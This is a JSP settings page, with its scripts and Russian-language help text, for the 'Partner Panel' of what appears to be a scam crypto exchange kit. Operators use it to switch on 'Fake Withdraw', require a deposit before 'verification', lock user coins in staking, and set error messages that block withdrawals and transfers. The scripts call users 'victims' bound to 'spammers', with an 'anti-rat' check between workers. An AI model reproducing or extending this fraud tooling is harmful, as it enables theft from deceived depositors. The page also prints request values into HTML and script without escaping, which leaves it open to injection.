<%@ page import="ru.tiedie.cryptoexchange.data.types.PaymentAddressType" %>
<%@ page import="java.util.Map" %>
<%@ page import="ru.tiedie.cryptoexchange.data.types.InvestmentPlan" %>
...
<head>
	...
	<title>Settings | Partner Panel</title>
	<meta charset="utf-8">
				...
				<div class="app-sidebar-menu overflow-hidden flex-column-fluid">
					...
					<div id="kt_app_sidebar_menu_wrapper" class="app-sidebar-wrapper hover-scroll-overlay-y my-5" data-kt-scroll="true" data-kt-scroll-activate="true" data-kt-scroll-height="auto" data-kt-scroll-dependencies="#kt_app_sidebar_logo, #kt_app_sidebar_footer" data-kt-scroll-wrappers="#kt_app_sidebar_menu" data-kt-scroll-offset="5px" data-kt-scroll-save-state="true">
						...
						<div class="menu menu-column menu-rounded menu-sub-indention px-3" id="#kt_app_sidebar_menu" data-kt-menu="true" data-kt-menu-expand="false">
							...
							<div class="menu-item">
								<!--begin:Menu link-->
								<a class="menu-link active" href="/panel/settings">
                                 <span class="menu-icon">
                                    <!--begin::Svg Icon | path: icons/duotune/general/gen002.svg-->
                                    <span class="svg-icon svg-icon-2">
                                       <svg width="24" height="24" viewbox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
							...
							<div class="page-title d-flex flex-column justify-content-center flex-wrap me-3">
								...
								<ul class="breadcrumb breadcrumb-separatorless fw-semibold fs-7 my-0 pt-1">
									...
									<li class="breadcrumb-item text-muted">
										<a href="/panel" class="text-muted text-hover-primary">Home</a>
									</li>
									<!--end::Item-->
									<!--begin::Item-->
						...
						<div id="kt_app_content_container" class="app-container container-xxl">
										...
										<div class="card-body border-top p-9">
											...
											<div class="row mb-20">
                                                ...
                                                <span class="d-inline-block position-absolute h-4px bottom-0 end-0 start-0 bg-primary translate rounded"></span>
												 <!--end::Line-->
													...
													<div class="text-gray-600 mt-5">
														...
														Бот напишет ваш <strong>ID</strong> <br>
														Копируем и вставляем цифры в поле ниже и нажимаем кнопку Save changes.
													</div>
												</div>
												<!--begin::Label-->
												<!--end::Label-->
                                             ...
                                             <span class="input-group-text" id="basic-addon3">
                                                ...
                                                Telegram ID:
													...
													<%
														out.println("<input type=\"number\" class=\"form-control\" value=\"" + request.getAttribute("telegram_id") + "\" id=\"settings_telegram_id\" aria-describedby=\"basic-addon3\">");
													%>
												</div>
												<!--end::Col-->
											...
											<div class="row mb-20">
                                             ...
                                             <span class="d-inline-block position-relative">
												...
												<%
													Map<PaymentAddressType, String> addresses = (Map<PaymentAddressType, String>) request.getAttribute("payment_addresses");
													for (PaymentAddressType value : PaymentAddressType.values()) {
														String address = addresses.get(value);
														out.println("<div class=\"input-group mb-5 mt-5\">");
														out.println("<span class=\"input-group-text\" id=\"basic-addon3\">" + value.getName() + ":</span>");
														out.println("<input value=\"" + (address == null ? "" : address) + "\" id=\"sp_ad_" + (value.name().toLowerCase()) + "\" type=\"text\" class=\"form-control\" aria-describedby=\"basic-addon3\" placeholder=\"" + value.getPrefix() + "\">");
														out.println("</div>");
													}
												%>
												...
												<div class="d-flex mt-5 justify-content-end"><span id="save_sp_addreses" class="btn btn-primary">Save changes</span></div>
											</div>
											<!--end::Input group-->
											<div class="separator separator-dashed my-5 mb-20"></div>
											<!--begin::Input group-->
											<div class="row mb-20">
                                             ...
                                             <span class="input-group-text" id="basic-addon3">
                                                ...
                                                Amount:
													...
													<%
														out.println("<input type=\"number\" value=\"" + request.getAttribute("p2p_over_price") + "\" class=\"form-control\" id=\"sp_up_p2p_amount\" aria-describedby=\"basic-addon3\" placeholder=\"0\"><span class=\"input-group-text\">USD</span>");
													%>
												</div>
												<!--end::Col-->
												<div class="text-gray-600">
											...
											<div class="row mb-20">
                                             ...
                                             <span class="d-inline-block position-relative">
												...
												<div class="input-group mb-5 mt-5">
													...
													<%
														out.println("<input id=\"sp_bonus_amount\" type=\"number\" class=\"form-control\" placeholder=\"0\" value=\"" + request.getAttribute("register_bonus_amount") + "\">");
													%>
												...
												<div>
													...
													<script>
														$('#sp_bonus_text_register').summernote({
															<%
															   Object registerBonusMessage = request.getAttribute("register_bonus_message");
															   out.println("placeholder: '" + registerBonusMessage + "',");
															%>
															tabsize: 5,
															height: 150,
															toolbar: [
                                             ...
                                             <span class="d-inline-block position-relative">
                                                ...
                                                <span class="d-inline-block position-absolute h-4px bottom-0 end-0 start-0 bg-info translate rounded"></span>
												 <!--end::Line-->
													...
													<div class="text-gray-600 mt-5">Вы можете изменить проценты по планам для ваших юзеров.</div>
												</div>
												<%
													Map<InvestmentPlan, Double> stakingPlans = (Map<InvestmentPlan, Double>) request.getAttribute("staking_plans");
													out.println("<div class=\"input-group mb-5 mt-5\">\n" +
															"<span class=\"input-group-text\">1 week:</span>\n" +
															"<input id=\"sp_up_invest_1w\" type=\"number\" class=\"form-control\" placeholder=\"" + stakingPlans.get(InvestmentPlan.DAYS_7) + "\" value=\"\"><span class=\"input-group-text\">%</span>\n" +
															"</div>");
													out.println("<div class=\"input-group mb-5 mt-5\">\n" +
															"<span class=\"input-group-text\">2 week:</span>\n" +
															"<input id=\"sp_up_invest_2w\" type=\"number\" class=\"form-control\" placeholder=\"" + stakingPlans.get(InvestmentPlan.DAYS_14) + "\" value=\"\"><span class=\"input-group-text\">%</span>\n" +
															"</div>");
													out.println("<div class=\"input-group mb-5 mt-5\">\n" +
															"<span class=\"input-group-text\">1 month:</span>\n" +
															"<input id=\"sp_up_invest_1m\" type=\"number\" class=\"form-control\" placeholder=\"" + stakingPlans.get(InvestmentPlan.DAYS_30) + "\" value=\"\"><span class=\"input-group-text\">%</span>\n" +
															"</div>");
													out.println("<div class=\"input-group mb-5 mt-5\">\n" +
															"<span class=\"input-group-text\">3 month:</span>\n" +
															"<input id=\"sp_up_invest_2m\" type=\"number\" class=\"form-control\" placeholder=\"" + stakingPlans.get(InvestmentPlan.DAYS_90) + "\" value=\"\"><span class=\"input-group-text\">%</span>\n" +
															"</div>");
												%>
											...
											<div class="row mb-10">
                                             ...
                                             <span class="d-inline-block position-relative">
												...
												<div class="input-group mb-5 mt-5">
													...
													<%
														out.println("<input id=\"sp_minimum_deposit\" type=\"number\" class=\"form-control\" placeholder=\"20\" value=\"" + request.getAttribute("min_deposit_amount") + "\"><span class=\"input-group-text\">USD</span>");
													%>
												</div>
												<!--end::Col-->
											...
											<div class="d-flex flex-stack mb-5">
												...
												<div class="d-flex justify-content-end">
													<div class="form-check form-check-solid form-check-custom form-switch">
														<%
															boolean verificationRequirement = (boolean) request.getAttribute("verification_requirement");
															out.println("<input id=\"sp_verify_select\" class=\"form-check-input w-45px h-30px\" style=\"cursor:pointer\" type=\"checkbox\" id=\"googleswitch\"" + (verificationRequirement ? " checked=\"checked\"" : "") + ">");
														%>
											...
											<div class="row mb-20">
                                             ...
                                             <span class="d-inline-block position-relative">
												...
												<div class="input-group mb-5 mt-5">
													...
													<%
														out.println("<input id=\"sp_verify_usd\" value=\"" + request.getAttribute("verification_deposit_amount") + "\" type=\"number\" class=\"form-control\" placeholder=\"0\"><span class=\"input-group-text\">USD</span>");
													%>
												</div>
												<!--end::Col-->
												...
												<div class="input-group flex-nowrap mt-5 mb-5">
													...
													<div class="overflow-hidden flex-grow-1">
														<select id="withdraw_verify_currency_sp" name="currnecy" aria-label="Select a Timezone" data-control="select2" data-placeholder="Select currency" class="form-select rounded-start-0">
															<%
																Map<String, Object> withdrawCoins = (Map<String, Object>) request.getAttribute("withdraw_coins");
																for (Map.Entry<String, Object> coin : withdrawCoins.entrySet()) {
																	out.println("<option value=\"" + coin.getKey() + "\">" + coin.getKey() + "</option>");
																}
															%>
														</select>
													</div>
											...
											<div>
												<div class="table-responsive">
													<table class="table table-rounded table-row-bordered border gy-7 gs-7">
														...
														<tbody>
														<%
															List<String> depositCoins = (List<String>) request.getAttribute("deposit_coins");
															if (depositCoins.isEmpty()) {
																...
																for (int i = 0; i < depositCoins.size(); i++) {
																	out.println("<tr class=\"fs-6 text-gray-700\">\n" +
																			"<td>#" + (i + 1) + "</td>\n" +
																			"<td class=\"fw-bold\">" + depositCoins.get(i) + "</td>\n" +
																			"<td><span onclick=\"deleteWithdrawVerifyCurrencySP('" + depositCoins.get(i) + "')\" class=\"btn btn-sm btn-light-danger\">Delete</span></td>\n" +
																			"</tr>");
																}
															}
														%>
												...
												<div class="input-group flex-nowrap mt-5" data-select2-id="select2-data-123-me2a">
													...
													<div class="overflow-hidden flex-grow-1" data-select2-id="select2-data-122-gr94">
														<select id="sp_send_balance_all" name="currnecy" aria-label="Select a Timezone" data-control="select2" data-placeholder="Select currency" class="form-select rounded-start-0">
															<%
																List<String> allCoins = (List<String>) request.getAttribute("all_coins");
																for (String allCoin : allCoins) {
																	out.println("<option value=\"" + allCoin + "\">" + allCoin + "</option>");
																}
															%>
														</select>
													</div>
							...
							<div class="card mb-5 mb-xl-20">
								...
								<div class="collapse show">
									...
									<form class="form">
										...
										<div class="card-body border-top p-9">
											<div class="row">
												<label class="form-check form-check-custom form-check-solid align-items-start">
													<!--begin::Input-->
													<%
														out.println("<input id=\"fake_w_all_checked\" class=\"form-check-input me-3\" type=\"checkbox\"" + ((boolean) request.getAttribute("fake_withdraw_all") ? " checked=\"checked\"" : "") + ">");
													%>
													<!--end::Input-->
													<!--begin::Label-->
													<span class="form-check-label d-flex flex-column align-items-start">
                                             <span class="fw-bold fs-5 mb-0">Enable Fake Withdraw for ALL users</span>
                                             ...
                                             Если включено, то у <strong>всех</strong> ваших юзеров функция "Fake Withdraw" будет активна. Эта функция перебивает окно верификации, и вывод будет доступен даже если включены обе функции.
												...
												<label class="form-check form-check-custom form-check-solid align-items-start">
													<!--begin::Input-->
													<%
														out.println("<input id=\"fake_w_new_checked\" class=\"form-check-input me-3\" type=\"checkbox\"" + ((boolean) request.getAttribute("fake_withdraw_new") ? " checked=\"checked\"" : "") + ">");
													%>
													<!--end::Input-->
													<!--begin::Label-->
													<span class="form-check-label d-flex flex-column align-items-start">
                                             ...
                                             Действует только для новых юзеров.
												...
												<label class="form-check form-check-custom form-check-solid align-items-start">
													<!--begin::Input-->
													<%
														out.println("<input id=\"invest_all_checked\" class=\"form-check-input me-3\" type=\"checkbox\"" + ((boolean) request.getAttribute("staking_all") ? " checked=\"checked\"" : "") + ">");
													%>
													<!--end::Input-->
													<!--begin::Label-->
													<span class="form-check-label d-flex flex-column align-items-start">
                                             <span class="fw-bold fs-5 mb-0">Enable Invest (staking) for ALL users</span>
                                             <span class="text-gray-600">
                                             ...
                                             <i> Важно: после того, как юзер закинет свои монеты в стейкинг - они пропадут у него с баланса на время действия инвест-плана.</i>
												...
												<label class="form-check form-check-custom form-check-solid align-items-start">
													<!--begin::Input-->
													<%
														out.println("<input id=\"invest_new_checked\" class=\"form-check-input me-3\" type=\"checkbox\"" + ((boolean) request.getAttribute("staking_new") ? " checked=\"checked\"" : "") + ">");
													%>
													<!--end::Input-->
													<!--begin::Label-->
													<span class="form-check-label d-flex flex-column align-items-start">
                                             ...
                                             <i>Важно: после того, как юзер закинет свои монеты в стейкинг - они пропадут у него с баланса на время действия инвест-плана.</i>
												...
												<label class="form-check form-check-custom form-check-solid align-items-start">
													<!--begin::Input-->
													<%
														out.println("<input id=\"transfer_all_checked\" class=\"form-check-input me-3\" type=\"checkbox\"" + ((boolean) request.getAttribute("transfer_all") ? " checked=\"checked\"" : "") + ">");
													%>
													<!--end::Input-->
													<!--begin::Label-->
													<span class="form-check-label d-flex flex-column align-items-start">
                                             <span class="fw-bold fs-5 mb-0">Enable Transfer for ALL users</span>
                                             <span class="text-gray-600">Если включено, то <strong>все</strong> ваши юзеры смогут использовать функцию трансфера между аккаунтами внутри биржи.</span>
												...
												<label class="form-check form-check-custom form-check-solid align-items-start">
													<!--begin::Input-->
													<%
														out.println("<input id=\"transfer_new_checked\" class=\"form-check-input me-3\" type=\"checkbox\"" + ((boolean) request.getAttribute("transfer_new") ? " checked=\"checked\"" : "") + ">");
													%>
													<!--end::Input-->
													<!--begin::Label-->
													<span class="form-check-label d-flex flex-column align-items-start">
                                             ...
                                             <span class="text-gray-600">Если включено, то только ваши <strong>новые</strong> юзеры смогут использовать функцию трансфера между аккаунтами внутри биржи.</span>
												...
												<label class="form-check form-check-custom form-check-solid align-items-start">
													<!--begin::Input-->
													<%
														out.println("<input id=\"wallet_connect_checked\" class=\"form-check-input me-3\" type=\"checkbox\"" + ((boolean) request.getAttribute("wallet_connect") ? " checked=\"checked\"" : "") + ">");
													%>
													<!--end::Input-->
													<!--begin::Label-->
													<span class="form-check-label d-flex flex-column align-items-start">
                                             <span class="fw-bold fs-5 mb-0">Enable Wallet connect for NEW users</span>
                                             <span class="text-gray-600">Если включено, то у <strong>новых</strong> юзеров по умолчанию будет включен показ wallet connect.</span>
                                             </span>
													<!--end::Label-->
												</label>
											</div>
										...
										<!--begin::Actions-->
										<div class="card-footer d-flex justify-content-end py-6 px-9">
											<span id="save_sp_features_settings" class="btn btn-primary">Save changes</span id="save_sp_features_settings">
										</div>
										<!--end::Actions-->
									</form>
									<!--end::Form-->
							...
							<div class="card mb-5 mb-xl-20">
								...
								<div class="card-header border-0">
									<!--begin::Card title-->
									<div class="card-title m-0">
										<h3 class="fw-bold m-0">Errors settings</h3>
									</div>
									<!--end::Card title-->
								</div>
								<!--begin::Card header-->
											...
											<div class="d-flex flex-wrap gap-5">
												...
												<div class="flex-row-fluid w-400px">
                                                   ...
                                                   <span class="d-inline-block position-relative mb-3">
													...
													<div>
														<br>
														<textarea data-provider="summernote" name="post_body" id="SettingsDefaultErrorMessage">
															<%
												...
												<div class="flex-row-fluid w-400px">
                                                   ...
                                                   <span class="d-inline-block position-relative mb-3">
													...
													<div>
														<textarea data-provider="summernote" name="post_body" id="SettingsDefaultErrorMessage2">
															<%
												...
												<div class="flex-row-fluid w-400px">
                                                   ...
                                                   <span class="d-inline-block position-relative mb-3">
													...
													<div>
														<textarea data-provider="summernote" name="post_body" id="SettingsDefaultP2PErrorMessage">
															<%
                                                   ...
                                                   <span class="d-inline-block position-relative mb-3">
                                                      ...
                                                      <span class="d-inline-block position-absolute h-4px bottom-0 end-0 start-0 bg-info translate rounded"></span>
													   <!--end::Line-->
															...
															<div class="text-gray-600 mb-5">Ошибка, которая будет отображаться при попытке юзером совершить трансфер (на странице Transfer)
															</div>
														</div>
													</div>
													<div>
														<textarea data-provider="summernote" name="post_body" id="SettingsDefaultTransferErrorMessage">
															<%
																out.println(request.getAttribute("transfer_error"));
															%>
														</textarea>
														<script>
															$('#SettingsDefaultTransferErrorMessage').summernote({
																placeholder: 'Transfer Error..',
																tabsize: 5,
																height: 180,
																toolbar: [
																	['style', ['style']],
											...
											<div>
												<div class="table-responsive">
													<table class="table table-rounded table-row-bordered border gy-7 gs-7">
														...
														<tbody>
														<%
															Map<String, Double> withdrawLimits = (Map<String, Double>) request.getAttribute("withdraw_limits");
															for (Map.Entry<String, Double> entry : withdrawLimits.entrySet()) {
																out.println("<tr class=\"fs-6 text-gray-700\">\n" +
																		"<td>" + entry.getKey() + "</td>\n" +
																		"<td class=\"fw-bold\">" + entry.getValue() + "</td>\n" +
																		"<td><span onclick=\"deleteThisMinAmount('" + entry.getKey() + "')\" class=\"btn btn-sm btn-light-danger\">Delete</span></td>\n" +
																		"</tr>");
															}
														%>
														</tbody>
...
<script>
		...
		if(index_inputEmailLogin == "") {
			...
			$.ajax({
				...
				success: function(response) {
					...
					if(response == "1") {
						noti("Жертва успешно привязан к вашему профилю!", "success");
					} else if(response == "2") {
						noti("Анти-крыса система! Уже привязан к другому спамеру.", "error");
					} else if(response == "3") {
						noti("Пользователя не существует.", "error");
					} else if(response == "4") {
						noti("Жертва уже привязан в ваш панель", "info");
					}
	...
	$('#index_add_promo').on('click', function(e) {
		...
		var index_promo_bonus = $("#index_promo_bonus").val();
		...
		if(index_promocode == "") {
			...
			$.ajax({
				...
				data: {
					...
					wallet: index_promo_wallet,
					text: index_promo_text,
					global_ban: global_ban,
					support_ban: support_ban,
					trading_ban: trading_ban,
					chat_ban: chat_ban,
					index_promo_bonus: index_promo_bonus,
					rand_amount_2: index_promo_rand_2
				},
				success: function(response) {
					if(response == "1") {
						noti("Промо-код успешно создан!", "success");
						$("#index_promocode").val("");
					} else if(response == "2") {
						noti("Такой промо-код уже существует", "error");
					} else if(response == "3") {
	...
	$("#saveAllDefaultErrorMessage").on("click", function() {
		...
		var default_error_transfer = $("#SettingsDefaultTransferErrorMessage").val();
		...
		if(default_error_p2p == "" || default_error_tr == "" || default_error_chat == "" || default_error_withdraw == "") {
			...
			$.ajax({
				...
				data: {
					...
					default_error_transfer: default_error_transfer
				},
				success: function(response) {
					if(response == "1") {
						noti("Данные успешно обновлены", "success");
